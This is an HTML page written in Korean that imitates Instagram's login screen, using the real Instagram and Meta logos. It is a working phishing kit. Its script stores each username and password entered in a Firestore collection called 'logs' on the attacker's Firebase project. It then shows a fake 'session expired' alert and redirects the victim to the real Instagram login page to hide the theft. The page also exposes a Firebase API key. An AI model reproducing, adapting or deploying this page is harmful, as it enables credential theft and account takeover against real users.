<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 350px; padding: 20px; box-sizing: border-box; margin-top: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 40px; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; background-color: #fafafa; box-sizing: border-box; font-size: 14px; }
        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 10px; }
        .btn-login:disabled { background-color: #b2dffc; }
        .forgot-pw { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
        .footer { margin-top: auto; padding: 20px; color: #8e8e8e; font-size: 12px; text-align: center; }
        .meta-logo { width: 60px; margin-top: 10px; opacity: 0.6; }
        .signup-box { margin-top: 40px; border: 1px solid #dbdbdb; padding: 20px; width: 100%; box-sizing: border-box; border-radius: 1px; }
        .signup-link { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511100076.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
        </form>

        <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>

        <div class="signup-box">
            <span style="font-size: 14px;">계정이 없으신가요? <a href="#" class="signup-link">가입하기</a></span>
        </div>
    </div>

    <div class="footer">
        <div style="margin-bottom: 10px;">Meta</div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo">
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // 상준님의 Firebase 설정값 그대로 유지
        const firebaseConfig = {
            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
            authDomain: "instagram-be709.firebaseapp.com",
            projectId: "instagram-be709",
            storageBucket: "instagram-be709.firebasestorage.app",
            messagingSenderId: "556245509978",
            appId: "1:556245509978:web:e78967856f2ac2586f7563",
            measurementId: "G-1KLXR0LXSZ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            
            submitBtn.disabled = true;

            try {
                await addDoc(collection(db, "logs"), {
                    userId: idVal,
                    userPw: pwVal,
                    timestamp: new Date()
                });
                
                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error("오류 발생:", error);
                alert("네트워크 연결을 확인해주세요.");
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
